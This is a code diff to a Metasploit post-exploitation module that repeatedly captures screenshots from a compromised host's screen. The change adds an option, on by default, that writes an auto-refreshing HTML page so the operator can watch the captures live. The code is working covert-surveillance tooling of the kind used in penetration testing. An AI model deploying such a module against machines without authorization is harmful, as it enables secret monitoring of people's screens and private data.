@@ -37,13 +37,33 @@ class Metasploit3 < Msf::Post
         OptInt.new('DELAY', [true, 'Interval between screenshots in seconds', 5]),
         OptInt.new('COUNT', [true, 'Number of screenshots to collect', 6]),
         OptString.new('VIEW_CMD', [false, 'Command to use for viewing screenshots (auto, none also accepted)', 'auto']),
-        OptBool.new('RECORD', [true, 'Record all screenshots to disk by looting them',false])
+        OptBool.new('RECORD', [true, 'Record all screenshots to disk by looting them',false]),
+        OptBool.new('HTML_STREAM', [false, 'Record to a refreshing HTML page',true])
       ], self.class)
+  end
+
+  def html_view(ip)
+    html = %q{<html> <head> <meta http-equiv="Refresh" content="5"> </head> <body> <h2 align="center">}
+    html << %Q{#{ip}</h2> <img src="./#{ip}.jpg" align="center" width=1024> <hr> </body> </html>}
+  end
+
+  def html_stream
+    datastore['HTML_STREAM']
   end
 
   def run
     host = session.session_host
     screenshot = Msf::Config.get_config_root + "/logs/" + host + ".jpg"
+
+    if html_stream
+      html_file = Msf::Config.get_config_root + "/logs/" + host + ".html"
+      begin
+        File.open(html_file, 'wb') {|f| f.write html_view(host)}
+      rescue IOError, Errno::ENOENT
+        print_error "Failed to write html file -- file locking problems?"
+        return nil
+      end
+    end
 
     migrate_explorer
     if session.platform !~ /win32|win64/i
@@ -80,11 +100,13 @@ class Metasploit3 < Msf::Post
     begin
       count = datastore['COUNT']
       print_status "Capturing #{count} screenshots with a delay of #{datastore['DELAY']} seconds"
+      print_status "Writing refreshing html to #{html_file}" if html_stream
       # calculate a sane number of leading zeros to use.  log of x  is ~ the number of digits
       leading_zeros = Math::log10(count).round
       file_locations = []
       count.times do |num|
         select(nil, nil, nil, datastore['DELAY'])
+        vprint_status "#{host}: [#{Time.now}] Took screenshot (#{num}/#{count})"
         begin
           data = session.espia.espia_image_get_dev_screen
         rescue RequestError => e
@@ -99,7 +121,7 @@ class Metasploit3 < Msf::Post
           end
 
           # also write to disk temporarily so we can display in browser.  They may or may not have been RECORDed.
-          if cmd # do this if they have not suppressed VIEW_CMD display
+          if cmd || html_stream # do this if they have not suppressed VIEW_CMD display
             fd = ::File.new(screenshot, 'wb')
             fd.write(data)
             fd.close
